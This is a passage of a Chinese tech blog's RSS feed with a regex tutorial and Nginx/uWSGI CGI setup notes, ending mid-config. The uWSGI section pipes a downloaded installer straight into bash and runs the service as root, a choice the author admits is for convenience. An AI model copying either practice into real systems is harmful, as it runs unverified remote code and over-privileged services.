class="headerlink" title="参考"></a>参考</h2><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuaXRjb2RlbW9ua2V5LmNvbS9hcnRpY2xlLzIxODUuaHRtbA==" title="https://www.itcodemonkey.com/article/2185.html">https://www.itcodemonkey.com/article/2185.html<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTM5NDM0MjAvYXJ0aWNsZS9kZXRhaWxzLzc1NzMzMTc1" title="https://blog.csdn.net/u013943420/article/details/75733175">https://blog.csdn.net/u013943420/article/details/75733175<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY3RmdG9vbHMuY29tL2Rvd24v" title="https://www.ctftools.com/down/">https://www.ctftools.com/down/<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy93ZWIvMTI5NjA3Lmh0bWw=" title="http://www.freebuf.com/articles/web/129607.html">http://www.freebuf.com/articles/web/129607.html<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9hc2suaGVscGxpYi5jb20vcGhwL3Bvc3RfMTIxODE5MA==" title="https://ask.helplib.com/php/post_1218190">https://ask.helplib.com/php/post_1218190<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9nZXRwb2NrZXQuY29tL2EvcmVhZC8xOTA0MDQ1NTky" title="https://getpocket.com/a/read/1904045592">https://getpocket.com/a/read/1904045592<i class="fa fa-external-link"></i></span></li></ul></blockquote>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/10/03/CTF_Writeup/#disqus_thread</comments>
    </item>
    
    <item>
      <title>正则简明</title>
      <link>https://www.diglp.xyz/2018/09/20/%E6%AD%A3%E5%88%99%E5%A4%A7%E7%AA%81%E7%A0%B4/</link>
      <guid>https://www.diglp.xyz/2018/09/20/%E6%AD%A3%E5%88%99%E5%A4%A7%E7%AA%81%E7%A0%B4/</guid>
      <pubDate>Wed, 19 Sep 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;p&gt;正则表达式，可谓是相当常用的东西了，看起来就是一堆奇怪的符号。正则表达式的强大之处就是在构建一个文本的规则&lt;/p&gt;
&lt;p&gt; 这次就对正则表达式做一个简单的学习记录吧。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;参考链接 &lt;span class=&quot;exturl&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<p>正则表达式，可谓是相当常用的东西了，看起来就是一堆奇怪的符号。正则表达式的强大之处就是在构建一个文本的规则</p><p> 这次就对正则表达式做一个简单的学习记录吧。</p><ul><li>参考链接 <span class="exturl" data-url="aHR0cDovL3d3dy5ydW5vb2IuY29tL3JlZ2V4cA==" title="http://www.runoob.com/regexp">http://www.runoob.com/regexp<i class="fa fa-external-link"></i></span></li></ul><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>正则表达式(<strong>Regular Expression</strong>)是一种文本模式，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为”元字符”）。</p><p><strong>正则表达式的功能</strong></p><ul><li>测试字符串内的模式。<br>例如，可以测试输入字符串，以查看字符串内是否出现电话号码模式或信用卡号码模式。这称为数据验证。</li><li>替换文本。<br>可以使用正则表达式来识别文档中的特定文本，完全删除该文本或者用其他文本替换它。</li><li>基于模式匹配从字符串中提取子字符串。<br>可以查找文档内或输入域内特定的文本。</li></ul><p>语法</p><p>如果我们把一个正则表达式看作一个字符串，在这个字符串里面有这样的 几类字符：</p><ul><li>普通字符 / 非打印字符</li><li>特殊字符</li><li>限定字符</li></ul><p><strong>普通字符</strong> 包括没有被指定为元字符的 所有可打印与不可打印字符。有 大小写字母，数字，标点符号，一起其他符号</p><p><strong>Tips</strong></p><blockquote><p>\n = 0x0a</p><p>\r = 0x0d</p><p>CRLF = \r\n</p><p>LF = \n</p></blockquote><table><thead><tr><th>符号</th><th>描述</th></tr></thead><tbody><tr><td>*</td><td>匹配前子表达式的零次或多次匹配</td></tr><tr><td>+</td><td>匹配前面表达式一次以上不允许0</td></tr><tr><td>.</td><td>匹配换行(\n)以外的的单字符</td></tr><tr><td>^</td><td>匹配开始 转义使用 \^</td></tr><tr><td>$</td><td>匹配结束 转义使用 \$</td></tr><tr><td>( )</td><td>子表达式的开始结束</td></tr><tr><td>[]</td><td>中括号表达式</td></tr><tr><td>?</td><td>匹配0次或者一次</td></tr><tr><td>\</td><td>用于转义 如 \n 即匹配换行</td></tr><tr><td>{}</td><td>标记限定符</td></tr><tr><td>&#124;</td><td>两项间选择</td></tr></tbody></table><blockquote><p>题外话：这里的<code>|</code>符号在表格里面，由于是用来制表的，所以这里使用特殊方法<code>&amp;#124;</code> 来输出</p></blockquote><h3 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h3><p>限定符用于指定一个匹配部分需要被匹配的限定（匹配次数）。</p><p><code>*, +, ?, {n},{n,},{n,m}</code></p><table><thead><tr><th>符号</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>*</td><td>匹配前面子表达式0或多次</td><td>‘ab*‘ re abbb or a</td></tr><tr><td>+</td><td>匹配一次或多次</td><td>同上无 a</td></tr><tr><td>?</td><td>零次或一次</td><td>ab or a</td></tr><tr><td>{n}</td><td>匹配指定次</td><td>ab(n个)</td></tr><tr><td>{n,}</td><td>匹配指定次以上</td><td>ab(n个以上b)</td></tr><tr><td>{n,m}</td><td>区间，最少n次最多m次</td><td>同理</td></tr></tbody></table><hr><p>之前一直以为 * 是任意通配符，导致了好多的问题</p><p>在这里是网页的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/&lt;.*&gt;/# 这个正则乍一看还是不懂，慢慢看</span><br><span class="line">/&lt;.*?&gt;/</span><br></pre></td></tr></table></figure><p>慢慢看，发现其实可以理解，首先，&lt;&gt; 通过转义就是领个符号，那么就是匹配中间的部分。</p><p><strong>.</strong> 代表着除了换行以为的单字符。后面的 * 说明0次或多次匹配前面的子表达式，那么连起来这里的意思就是，匹配一个任意的字符串。比如 <1231231212>.</1231231212></p><p><strong>*，+ 匹配时贪婪的</strong> 这里说的时这个匹配的贪婪性。 如果有这样的一个字符串 ：<123>123<123> 那么使用上面的第一个正则表达式 ，得到的匹配结果，就是  最开始的 &lt; 到最后的 &gt; 之间的所有内容。</123></123></p><p>所以，实现非贪婪的匹配，这里使用了第二个表达式， 理解起来，就是在前面的匹配任意字符串的子表达式 上添加了只匹配一次的条件，这样的匹配时非贪婪的。如果同样的是 <123>123<123> 这里得到的结果就是 <123> 而已。</123></123></123></p><h3 id="定位符"><a href="#定位符" class="headerlink" title="定位符"></a>定位符</h3><table><thead><tr><th>符号</th><th>描述</th></tr></thead><tbody><tr><td>^</td><td>匹配字符串开始的位置</td></tr><tr><td>$</td><td>匹配字符串的结束位置</td></tr><tr><td>\b</td><td>匹配一个单词边界 如空格</td></tr></tbody></table><hr><p>限定符和定位符，不允许同时出现。</p><p>如果是从头开始匹配一个文本的话，就使用 ^ ，如果是匹配结束处的内容就是使用 $ 在末尾。如果是单行匹配，这里使用 ^…$</p><h3 id="基本模式匹配"><a href="#基本模式匹配" class="headerlink" title="基本模式匹配"></a>基本模式匹配</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">abc </span><br><span class="line">^abc</span><br><span class="line">abc$</span><br><span class="line">^abc$</span><br></pre></td></tr></table></figure><p>第一项匹配所有包含该串的内容</p><p>第二项只匹配 以该串开头的内容</p><p>第三项匹配 以该串结尾的内容</p><p>第四项只匹配该串</p><h3 id="其他符合"><a href="#其他符合" class="headerlink" title="其他符合"></a>其他符合</h3><table><thead><tr><th>符合</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>\</td><td></td><td>表达式或操作</td><td>a \</td><td>zxc 匹配a或者zxc</td></tr><tr><td>[]</td><td>字符集合</td><td>[abc] or [a-b]</td></tr><tr><td>[^]</td><td>负字符集合</td><td>[^asd] 不匹配其中的字符</td></tr><tr><td>[a-z]</td><td></td><td></td></tr><tr><td>[^a-z]</td><td></td></tr></tbody></table><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>这里收集正则在几个语言下的应用：</p><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>在 pyhton 下的正则模块是 re</p><h4 id="字符串的正则检测"><a href="#字符串的正则检测" class="headerlink" title="字符串的正则检测"></a>字符串的正则检测</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">re.match(pattern, string, flags=0)</span><br><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; print( re.match(&apos;[ca]+&apos;, &apos;acacac&apos;))</span><br><span class="line">&lt;re.Match object; span=(0, 6), match=&apos;acacac&apos;&gt;</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=" "></a> </h4><h4 id="对于字符串的正则提取"><a href="#对于字符串的正则提取" class="headerlink" title="对于字符串的正则提取"></a>对于字符串的正则提取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; matched_list = re.compile(r&apos;a+&apos;).find(&apos;aaa&apos;)</span><br><span class="line">&gt;&gt;&gt; re.compile(r&apos;a+b*&apos;).findall(&apos;aaabasd&apos;)</span><br><span class="line">[&apos;aaab&apos;, &apos;a&apos;]</span><br><span class="line">&gt;&gt;&gt; print( re.search(&apos;[ca]+&apos;, &apos;acacac&apos;).group())</span><br><span class="line">acacac</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print( re.search(&apos;[0-9]+\.php$&apos;, &apos;123.php&apos;).group())</span><br><span class="line">123.php</span><br><span class="line">&gt;&gt;&gt; print( re.search(&apos;[0-9]+\.php$&apos;, &apos;12asd3.php&apos;).group())</span><br><span class="line">3.php</span><br></pre></td></tr></table></figure><h3 id="JavaScrip"><a href="#JavaScrip" class="headerlink" title="JavaScrip"></a>JavaScrip</h3><h4 id="对于字符串的提取"><a href="#对于字符串的提取" class="headerlink" title="对于字符串的提取"></a>对于字符串的提取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=&apos;assid123&apos;</span><br><span class="line">&gt; (a).match(&quot;[0-9]*$&quot;)[0]</span><br><span class="line">&quot;123&quot;</span><br><span class="line">&gt; (a).match(&quot;^[0-9]*&quot;)[0]// 这里没有以数字开头</span><br><span class="line">&quot;&quot;</span><br></pre></td></tr></table></figure><h3 id="Nginx-Conf"><a href="#Nginx-Conf" class="headerlink" title="Nginx Conf"></a>Nginx Conf</h3><p>对于正则表达式在 Nginx 的配置文件里面的应用也是相当的广泛  了</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span>   http://127.0.0.1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">    <span class="attribute">root</span>           html;</span><br><span class="line">    <span class="attribute">fastcgi_pass</span>   <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">    <span class="attribute">fastcgi_index</span>  index.php;</span><br><span class="line">    <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME  /scripts<span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">    <span class="attribute">include</span>        fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的是 Nginx.conf 里面的实例配置，从功能上讲，前者是使用 Nginx 作为转发，如注释说明，最后是apache 对php 进行解析执行。后者是使用 fastcgi ，使用 php-fpm 进行脚本执行。</p><p>不过重点的正则表达式可以看见</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~ \.php$</span><br></pre></td></tr></table></figure><p>这里值得注意的是  <code>~</code> 并不是标准的正则表达式里的东西。而是Nginx 里特有的，表示该匹配时大小写敏感的。</p><p>记得之前有句话，web 安全里的，怎么判断主机是linux 还是 windows 答曰改变 URL 的大小写。这里看来也是不一定正确的。</p><p>后面的部分，可以看出 <code>\.</code> 是对dot 的转义，说明其是字符点，不是匹配任意单字符的意思。总体可见该正则的意思是，对.php 进行匹配。如果如果匹配到 .php 的url 之后，就把请求传递给 CGI 处理任务了。</p><blockquote><p>参考链接：</p><p>Nginx 在URL 匹配上还有自己的限定符号</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2d6aDAyMjIvYXJ0aWNsZS9kZXRhaWxzLzc4NDU5ODE=" title="https://blog.csdn.net/gzh0222/article/details/7845981">Nginx正则说明<i class="fa fa-external-link"></i></span></li></ul></blockquote><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>再也不会看到正则就发晕了，至少简单的可以看懂一些，这个 post 也算是纠正了自己的一些误区吧。加油~</p><p>有一盒月饼也不会开心，中秋快乐~</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/09/20/%E6%AD%A3%E5%88%99%E5%A4%A7%E7%AA%81%E7%A0%B4/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Nginx 基础杂记</title>
      <link>https://www.diglp.xyz/2018/09/09/OP_Nginx_CGI/</link>
      <guid>https://www.diglp.xyz/2018/09/09/OP_Nginx_CGI/</guid>
      <pubDate>Sat, 08 Sep 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><blockquote><p>实践是最好的复习方式，书中所学的东西很快的投入应用。得到的远超过理论本身</p></blockquote><p>再硅谷百年史中有一句话，大意是这样：</p><blockquote><p>硅谷并不一定是新技术产生的地方，但是新的技术得以在这片土地得到快速的传播，和应用，技术的本身得到快速迭代，展现出了无尽的生命力。</p></blockquote><p>上周，一个基础的Nginx入门， 这周很多地方都有用上都能用上。幸哉</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="CGI的配置"><a href="#CGI的配置" class="headerlink" title="CGI的配置"></a>CGI的配置</h3><p>这部分，简单的记录一个的基于 Nginx 的一个 CGI 服务器的配置过程。</p><h4 id="Nginx-的编译安装"><a href="#Nginx-的编译安装" class="headerlink" title="Nginx 的编译安装"></a>Nginx 的编译安装</h4><p>这部分在 Linux 的环境下，拥有了一个 GNU 的完整编译链的话，可以很容易的直接 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br></pre></td></tr></table></figure><p>使用 AUTOCONF 和 AUTOMAKE 直接生成和当前系统环境下的 配置的 Makefile 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make </span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>这两个命令，直接对 Nginx 进行编译安装。得到的文件在 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/nginx/</span><br><span class="line">$nginx_root/conf # 这个里面是它的配置文件所在的地方</span><br></pre></td></tr></table></figure><h4 id="uWSGI-编译安装"><a href="#uWSGI-编译安装" class="headerlink" title="uWSGI 编译安装"></a>uWSGI 编译安装</h4><p>uWSGI 官方提供了一键安装的操作，用起来oneClick ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://uwsgi.it/install | bash -s default /tmp/uwsgi</span><br></pre></td></tr></table></figure><p>后面是编译输出的路径。这样一个回车键就可以</p><p>在 <code>/tmp/uwsgi</code> 下面的就是我们编译的bin文件</p><h4 id="Nginx-CGI-的配置"><a href="#Nginx-CGI-的配置" class="headerlink" title="Nginx CGI 的配置"></a>Nginx CGI 的配置</h4><p>Nginx 可以根据不同的配置文件，以进程为单位启动多个。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./nginx [-t # 检查配置文件] [-c 指定配置文件路径]</span><br></pre></td></tr></table></figure><p>这里需要注意的是 ，nginx 的配置文件默认在 <code>/usr/local/conf</code>。所以这里，我们可以把配置文件夹拷贝到当前目录，之后使用 c 参数进行指定就好</p><hr><p>下面这部分是 Nginx 的配置，直接在预设的幕布就配置中进行修改就好，这里贴出配置文件：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">error_log</span>  logs/error.log;<span class="comment"># 这里可以配置 log 所记录的日志级别</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">pid</span>        logs/nginx.pid;<span class="comment"># Pid 文件，用于保存当前服务进程的PID</span></span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       mime.types;<span class="comment"># 多用途互联网邮件扩展（MIME，Multipurpose Internet Mail Extensions）</span></span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream;<span class="comment"># 这里设置类型</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#access_log  logs/access.log  main;# 访问日志</span></span><br><span class="line">    </span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line">    <span class="comment">#keepalive_timeout  0;</span></span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line">    <span class="comment">#gzip  on;</span></span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;<span class="comment"># 一个虚拟服务器的定义</span></span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">8000</span>;</span><br><span class="line">        <span class="attribute">server_name</span>  localhost;</span><br><span class="line">        <span class="attribute">charset</span>  utf-<span class="number">8</span>;<span class="comment"># 设置页面编码</span></span><br><span class="line">        <span class="comment">#access_log  logs/host.access.log  main;# 当前虚拟服务器的访问日志</span></span><br><span class="line">        </span><br><span class="line">        <span class="attribute">location</span> / &#123;<span class="comment"># 根路由配置</span></span><br><span class="line">            <span class="attribute">root</span>   html;<span class="comment"># 注意，如果在编译的时候没有指定 root</span></span><br><span class="line">            <span class="comment"># 这里的 html 是相对路径在 /usr/local/nginx/html/</span></span><br><span class="line">            <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># error_page  404              /404.html;</span></span><br><span class="line">        <span class="comment"># redirect server error pages to the static page /50x.html</span></span><br><span class="line"> </span><br><span class="line">        <span class="attribute">error_page</span>   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /50x.html; <span class="comment"># 定向错误码，到路由</span></span><br><span class="line">        <span class="attribute">location</span> = /50x.html &#123;<span class="comment"># 精确匹配路由</span></span><br><span class="line">            <span class="attribute">root</span>   html;<span class="comment"># 在 /html 里面找到 50x.html （alias 和 root）</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> /cgi-bin &#123;<span class="comment"># 这里就是一个 CGI 的路由配置了</span></span><br><span class="line">                <span class="attribute">include</span> uwsgi_params;<span class="comment"># 引入 uwsgi 的所有可用参数</span></span><br><span class="line">                <span class="attribute">uwsgi_modifier1</span> <span class="number">9</span>;</span><br><span class="line">                <span class="attribute">uwsgi_pass</span> <span class="number">127.0.0.1:9000</span>;<span class="comment"># CGI 请求传入本地监听 的9000 端口</span></span><br><span class="line">            <span class="comment"># 交给 uWSGI 执行</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见，在Nginx 里的主要的配置内容，是直接 使用 uWSGI 监听的端口， 进行命令传递，至此Nginx 的配置部分就好了，这里的重点，就是在与对应 路由的配置，</p><h4 id="uWSGI-配置"><a href="#uWSGI-配置" class="headerlink" title="uWSGI 配置"></a>uWSGI 配置</h4><p>在 uWSGI 直接使用 ./ 便可以将服务，运行起来。不过会出一堆挺吓人的警告。具体是其没有进行正确的配置。启动命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root ./uwsgi ./uwsgi.ini</span><br></pre></td></tr></table></figure><p>这里有一点是：uWSGI 服务，用于相应 WEB 请求，所以安全考虑，这里应该有严格的权限控制。使用</p><p><code>sudo -u nobody</code> 指定用户来启动 CGI 服务，这样可以控制CGI 脚本的权限，避免出现风险。不过这里由于需要对部分文件进行读写， 所以图方便使用了root。</p><p>uWSGI 的配置文件如下</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[uwsgi]</span></span><br><span class="line"><span class="attr">processes</span> = <span class="number">4</span># 指定worker数，是uWSGI 的worker</span><br><span class="line"><span class="attr">master</span> = <span class="literal">true</span># 这个配置重要，启用 master_process 不然将会工作在单线程模式</span><br><span class="line"><span class="comment"># 而且，只可以运行在前台</span></span><br><span class="line"><span class="attr">socket</span> = <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9000</span># 连接类型，以及监听端口</span><br><span class="line"><span class="attr">chdir</span> = /data/_dir/nginx/cgi-bin# CGI 脚本们的路径</span><br><span class="line"><span class="attr">cgi</span>=/cgi-bin=/data/_dir/nginx/cgi-bin</span><br><span class="line"><span class="attr">cgi-helper</span>=.py=python# 对不同的文件类型指定不同的解释器</span><br><span class="line"></span><br><span class="line"><span class="attr">daemonize</span> = /data/_dir/nginx/uwsgi/uwsgi.log# 后台运行的日志</span><br><span class="line"><span class="attr">pidfile</span> = /data/_dir/nginx/uwsgi/uwsgi.pid# PID 文件</span><br></pre></td></tr></table></figure><p>对上面的配置文件做了简单的解释，有了这样的配置文件之后，一个 基于 Nginx 的服务就已经搭建起来了。</p><h4 id="CGI-脚本"><a href="#CGI-脚本" class="headerlink" title="CGI 脚本"></a>CGI 脚本</h4><p>CGI 脚本们存在于 cgi-bin 这个目录下，如果有 web 对CGI 的路由进行了访问，那么这个http 请求将会被下发到 CGI 服务（uwsgi） 之后，它创建解释器进程，对我们的 脚本进行执行，并最终接收返回结果，传递回前端。</p><p>这里列出几个简单的脚本</p><ul><li><p>shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo "Content-Type:text/html"</span><br><span class="line">echo ""# 空行分隔</span><br><span class="line">echo "hello world!"</span><br></pre></td></tr></table></figure></li><li><p>Python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">print(<span class="string">"Content-type: text/html\n\n"</span>)</span><br><span class="line">print()<span class="comment"># 空行分隔</span></span><br><span class="line">print(<span class="string">"&lt;h1&gt;Hello World&lt;/h1&gt;"</span>)</span><br></pre></td></tr></table></figure></li></ul><p>又是教科书式的 <strong>helloworld</strong>。 这里我们就直接使用输出函数，对html 内容进行输入，最终他将返回到前端。</p><hr><h5 id="带上参数"><a href="#带上参数" class="headerlink" title="带上参数"></a>带上参数</h5><p>对于 CGI 请求，当然是可以带上了参数，这里只 说 GET 这种请求方式</p><p>使用 cgi 模块，可以很容易的提取参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cgi, cgitb</span><br><span class="line">form = cgi.FieldStorage()</span><br><span class="line">context  = form.getvalue(<span class="string">'keyword'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span></span><br><span class="line">print()<span class="comment"># 空行分隔</span></span><br><span class="line">print(<span class="string">"&lt;h1&gt;Hello World&lt;/h1&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;h2&gt;context&lt;/h2&gt;"</span>)</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><h5 id="Q-Uwsgi-只能前台运行的问题"><a href="#Q-Uwsgi-只能前台运行的问题" class="headerlink" title="Q: Uwsgi 只能前台运行的问题"></a>Q: Uwsgi 只能前台运行的问题</h5><p>在配置中 没有指定 Master_process 所以工作在单线程调试模式，<strong>./uwsgi</strong> 的过程中，发现其只能在前台以单进程的模式运行。在中发现是配置文件中，没有指定Master_process 的数量</p><p>所以导致，其是在单进程情况下运行在前台，多半这个为调试模式下的状态，单进程</p><hr><h5 id="Q-uwsgi-错误invalid-request-block-size"><a href="#Q-uwsgi-错误invalid-request-block-size" class="headerlink" title="Q: uwsgi 错误invalid request block size"></a>Q: uwsgi 错误invalid request block size</h5><p>这个其实不算问题，是自己在调试过程中发现的。使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl "127.0.0.1:9000" -V</span><br></pre></td></tr></table></figure><p>因为 curl 是发送的 http 的请求，uwsgi 默认绑定的是 socket。</p><p>实际上这个和 UWSGI 的绑定的协议有关。在测试时请求的 <strong>uwsgi.ini </strong> 配置文件里面内容把socket=:8000替换成http=:8000，可以切换 所绑定的协议</p><hr><h5 id="Q-PID-文件使用"><a href="#Q-PID-文件使用" class="headerlink" title="Q: PID 文件使用"></a>Q: <strong>PID</strong> 文件使用</h5><p>在 nginx 和 Uwsgi 的配置文件中，添加 PID 的参数，可以是的其在运行的时候生成 PID 文件</p><p>这样可以快速方便的给相关的进程发信号，进行重启或者是终止</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kill -HUP `cat ./xxx.pid`</span><br></pre></td></tr></table></figure><h3 id="一个简单的下载页面"><a href="#一个简单的下载页面" class="headerlink" title="一个简单的下载页面"></a>一个简单的下载页面</h3><p>这里是 Nginx 的另一组配置文件，实现的是开放一个页面可以进行文件俩蓝和下载</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 